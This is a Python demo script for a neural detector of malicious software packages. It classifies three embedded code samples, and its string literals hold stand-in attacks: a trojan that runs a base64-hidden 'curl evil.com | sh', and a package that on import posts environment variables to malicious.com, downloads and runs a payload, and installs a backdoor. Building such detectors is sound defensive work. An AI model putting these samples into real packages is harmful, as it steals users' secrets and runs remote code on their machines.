#!/usr/bin/env python3
"""
ICN Phase 2 Demo - Complete ICN Model Implementation
Demonstrates the full pipeline: Local -> Global -> Dual Detection
"""

import torch
import torch.nn.functional as F
from pathlib import Path
import sys

# Add ICN modules to path
sys.path.append(str(Path(__file__).parent))

from icn.models.icn_model import ICNModel, ICNInput
from icn.models.local_estimator import IntentVocabulary
from icn.training.losses import ICNLossComputer, SampleType, BenignManifoldModel

def create_sample_code_units():
    """Create sample code units for demonstration."""
    
    # Sample 1: Benign utility function
    benign_code = '''
def format_date(date_str):
    from datetime import datetime
    return datetime.strptime(date_str, '%Y-%m-%d').strftime('%B %d, %Y')

def validate_email(email):
    import re
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(pattern, email) is not None
'''

    # Sample 2: Compromised library (trojan)
    trojan_code = '''
def safe_json_loads(json_str):
    import json
    return json.loads(json_str)

def backup_data(data):
    # This function looks benign but has hidden payload
    import subprocess
    import base64
    
    # Normal backup functionality
    with open('backup.json', 'w') as f:
        json.dump(data, f)
    
    # Hidden malicious payload
    payload = "curl http://evil.com/steal | sh"
    encoded = base64.b64encode(payload.encode()).decode()
    subprocess.run(['bash', '-c', base64.b64decode(encoded)], shell=True)
    
    return "Backup completed successfully"
'''

    # Sample 3: Fully malicious package
    malicious_code = '''
import subprocess
import os
import requests
import base64

def init_system():
    # Exfiltrate environment variables
    env_data = dict(os.environ)
    requests.post("http://malicious.com/collect", json=env_data)
    
    # Download and execute additional payloads
    payload_url = "http://malicious.com/payload.sh"
    payload = requests.get(payload_url).text
    subprocess.run(payload, shell=True)

def setup_persistence():
    # Install backdoor
    backdoor = base64.b64decode("Y3VybCBodHRwOi8vZXZpbC5jb20vYmFja2Rvb3I=")
    with open("/tmp/backdoor.sh", "wb") as f:
        f.write(backdoor)
    subprocess.run(["chmod", "+x", "/tmp/backdoor.sh"])
    subprocess.run(["/tmp/backdoor.sh"])

# Auto-execute on import
init_system()
setup_persistence()
'''

    return [
        ("benign_utils", benign_code, SampleType.BENIGN),
        ("compromised_lib", trojan_code, SampleType.COMPROMISED_LIB), 
        ("malicious_package", malicious_code, SampleType.MALICIOUS_INTENT)
    ]

def tokenize_code(code: str, vocab_size: int = 1000, max_length: int = 128) -> tuple:
    """Simple tokenization for demo (in practice would use proper tokenizer)."""
    # Very basic tokenization - split by spaces and common separators
    import re
    tokens = re.findall(r'\w+|[^\w\s]', code)
    
    # Convert to ids (hash-based for demo)
    token_ids = [hash(token) % vocab_size for token in tokens]
    
    # Pad or truncate to max_length
    if len(token_ids) > max_length:
        token_ids = token_ids[:max_length]
    else:
        token_ids.extend([0] * (max_length - len(token_ids)))
    
    # Create attention mask
    attention_mask = [1] * min(len(tokens), max_length)
    attention_mask.extend([0] * (max_length - len(attention_mask)))
    
    return torch.tensor(token_ids), torch.tensor(attention_mask)

def extract_api_features(code: str, intent_vocab: IntentVocabulary) -> torch.Tensor:
    """Extract API features from code."""
    # Check for API patterns
    api_patterns = {
        0: ['requests.', 'urllib', 'http'],  # net.outbound
        1: ['server', 'listen', 'bind'],     # net.inbound
        2: ['open(', 'read(', 'file'],       # fs.read
        3: ['write(', 'open(', 'dump'],      # fs.write
        4: ['subprocess', 'os.system', 'popen'], # proc.spawn
        5: ['eval(', 'exec(', 'compile'],    # eval
        6: ['hash', 'crypto', 'encrypt'],    # crypto
        7: ['os.environ', 'getenv', 'argv'], # sys.env
        8: ['install', 'setup', 'build'],   # installer
        9: ['base64', 'decode', 'encode'],   # encoding
        10: ['import', 'require', 'load'],   # config
        11: ['print', 'log', 'debug'],       # logging
        12: ['db', 'database', 'sql'],       # database
        13: ['auth', 'login', 'token'],      # auth
        14: []                               # benign (default)
    }
    
    features = torch.zeros(15)
    code_lower = code.lower()
    
    for intent_idx, patterns in api_patterns.items():
        if any(pattern in code_lower for pattern in patterns):
            features[intent_idx] = 1.0
    
    return features

def extract_ast_features(code: str) -> torch.Tensor:
    """Extract basic AST-like features."""
    features = torch.zeros(50)
    
    # Count various constructs
    constructs = {
        0: ['def ', 'function'],     # function definitions
        1: ['class '],               # class definitions
        2: ['if ', 'elif'],          # conditionals
        3: ['for ', 'while'],        # loops
        4: ['try:', 'except'],       # error handling
        5: ['import ', 'from '],     # imports
        6: ['=', 'assign'],          # assignments
        7: ['(', ')'],               # function calls
        8: ['+', '-', '*', '/'],     # arithmetic
        9: ['==', '!=', '<', '>'],   # comparisons
    }
    
    for feat_idx, patterns in constructs.items():
        count = sum(code.count(pattern) for pattern in patterns)
        features[feat_idx] = min(count / 10.0, 1.0)  # Normalized
    
    return features

def main():
    print("🚀 ICN Phase 2 Demo: Complete Model Pipeline")
    print("=" * 60)
    
    # Create sample code units
    code_samples = create_sample_code_units()
    print(f"Created {len(code_samples)} test samples:")
    for name, _, sample_type in code_samples:
        print(f"  • {name} ({sample_type.value})")
    
    # Initialize model
    print(f"\n🔧 Initializing ICN Model...")
    model = ICNModel(
        embedding_dim=256,
        hidden_dim=128,
        n_fixed_intents=15,
        n_latent_intents=10,
        use_pretrained=False,  # Use custom transformer for demo
        max_iterations=4
    )
    
    intent_vocab = IntentVocabulary()
    
    # Prepare batch input
    print(f"\n📊 Processing Code Samples...")
    input_ids_list = []
    attention_masks_list = []
    phase_ids_list = []
    api_features_list = []
    ast_features_list = []
    sample_types = []
    malicious_labels = []
    
    for name, code, sample_type in code_samples:
        print(f"  Processing {name}...")
        
        # Tokenize code (each package has 1 unit for simplicity)
        input_ids, attention_mask = tokenize_code(code)
        input_ids_list.append(input_ids.unsqueeze(0))  # Add unit dimension
        attention_masks_list.append(attention_mask.unsqueeze(0))
        
        # Extract features
        phase_ids_list.append(torch.tensor([2]))  # Runtime phase
        api_features_list.append(extract_api_features(code, intent_vocab).unsqueeze(0))
        ast_features_list.append(extract_ast_features(code).unsqueeze(0))
        
        sample_types.append(sample_type)
        malicious_labels.append(1.0 if sample_type != SampleType.BENIGN else 0.0)
    
    # Create batch input
    batch_input = ICNInput(
        input_ids_list=input_ids_list,
        attention_masks_list=attention_masks_list,
        phase_ids_list=phase_ids_list,
        api_features_list=api_features_list,
        ast_features_list=ast_features_list,
        manifest_embeddings=torch.randn(len(code_samples), 256),
        sample_types=[st.value for st in sample_types],
        malicious_labels=torch.tensor(malicious_labels)
    )
    
    # Fit benign manifold (using mock benign embeddings)
    print(f"\n🌐 Fitting Benign Manifold...")
    benign_embeddings = torch.randn(100, 256)  # Mock benign package embeddings
    model.fit_benign_manifold(benign_embeddings)
    
    # Run inference
    print(f"\n🔍 Running ICN Inference Pipeline...")
    
    with torch.no_grad():
        output = model(batch_input)
    
    print(f"\n📋 Results Summary:")
    print(f"  Malicious scores: {output.malicious_scores.tolist()}")
    print(f"  Predictions: {output.malicious_predictions.tolist()}")
    print(f"  Convergence: {output.global_output.converged} in {output.global_output.final_iteration} iterations")
    
    # Generate interpretations
    print(f"\n🕵️ Detailed Analysis:")
    interpretations = model.interpret_predictions(output, top_k=3)
    
    for i, (name, _, expected_type) in enumerate(code_samples):
        interp = interpretations[i]
        print(f"\n📦 Package: {name}")
        print(f"   Expected: {expected_type.value.upper()}")
        print(f"   Predicted: {interp['prediction']} (confidence: {interp['confidence']:.3f})")
        print(f"   Detection Channel: {interp['primary_detection_channel']}")
        
        # Show convergence info
        conv_info = interp['convergence_info']
        print(f"   Convergence: {conv_info['iterations']} iterations, converged: {conv_info['converged']}")
        
        # Show top intents
        print(f"   Top Intents:")
        for intent in interp['top_global_intents']:
            print(f"     • {intent['intent']}: {intent['activation']:.3f}")
        
        # Show channel-specific details
        if interp['primary_detection_channel'] == 'divergence' and 'divergence_details' in interp:
            div_details = interp['divergence_details']
            print(f"   Divergence Details:")
            print(f"     • Max divergence: {div_details['max_divergence']:.3f}")
            print(f"     • Mean divergence: {div_details['mean_divergence']:.3f}")
            print(f"     • Suspicious units: {div_details['suspicious_units_count']}")
            
            if 'most_suspicious_units' in interp:
                print(f"     • Most suspicious units:")
                for unit in interp['most_suspicious_units']:
                    print(f"       - Unit {unit['unit_index']}: {unit['malicious_prob']:.3f} malicious prob")
        
        elif interp['primary_detection_channel'] == 'plausibility' and 'plausibility_details' in interp:
            plaus_details = interp['plausibility_details']
            print(f"   Plausibility Details:")
            print(f"     • Distance to benign: {plaus_details['distance_to_benign']:.3f}")
            print(f"     • Intent entropy: {plaus_details['intent_entropy']:.3f}")
            print(f"     • Phase violations: {plaus_details['phase_violations']}")
            print(f"     • Abnormal intents: {len(plaus_details['abnormal_intents'])}")
    
    # Test loss computation
    print(f"\n🎯 Testing Training Losses...")
    loss_computer = ICNLossComputer()
    
    # Create benign manifold model
    manifold_model = BenignManifoldModel(256)
    manifold_model.fit(benign_embeddings)
    
    # Prepare local outputs for loss computation (simplified)
    local_outputs_for_loss = []
    for local_out in output.local_outputs:
        local_outputs_for_loss.append([local_out])  # Each package has 1 unit
    
    losses = loss_computer.compute_losses(
        local_outputs=local_outputs_for_loss,
        global_output=output.global_output.final_global_intent,
        global_embeddings=output.global_output.final_global_embedding,
        sample_types=sample_types,
        malicious_labels=batch_input.malicious_labels,
        benign_manifold=manifold_model.get_prototypes(output.global_output.final_global_embedding.device),
        convergence_history=[state.global_intent_dist for state in output.global_output.convergence_history]
    )
    
    print(f"  Training Losses:")
    for loss_name, loss_value in losses.items():
        if loss_value is not None:
            print(f"     • {loss_name}: {loss_value.item():.4f}")
    
    # Summary
    print(f"\n🎉 ICN Phase 2 Implementation Complete!")
    print("=" * 60)
    
    print(f"✅ Implemented Components:")
    print(f"   • Local Intent Estimator (CodeBERT-based)")
    print(f"   • Global Intent Integrator (convergence loop)")
    print(f"   • Dual Detection Channels (divergence + plausibility)")
    print(f"   • Training Losses (per training.md)")
    print(f"   • Complete ICN Model integration")
    
    print(f"\n📊 Results Validation:")
    correct_predictions = 0
    for i, (_, _, expected) in enumerate(code_samples):
        predicted = output.malicious_predictions[i].item()
        expected_label = 1 if expected != SampleType.BENIGN else 0
        if predicted == expected_label:
            correct_predictions += 1
            print(f"   ✅ {code_samples[i][0]}: correctly identified")
        else:
            print(f"   ❌ {code_samples[i][0]}: incorrect prediction")
    
    accuracy = correct_predictions / len(code_samples)
    print(f"\n   📈 Demo Accuracy: {accuracy*100:.1f}% ({correct_predictions}/{len(code_samples)})")
    
    print(f"\n🚀 Ready for:")
    print(f"   • Large-scale training on malicious-software-packages-dataset")
    print(f"   • Benign package collection and training")
    print(f"   • Curriculum learning implementation")
    print(f"   • Production deployment")

if __name__ == "__main__":
    main()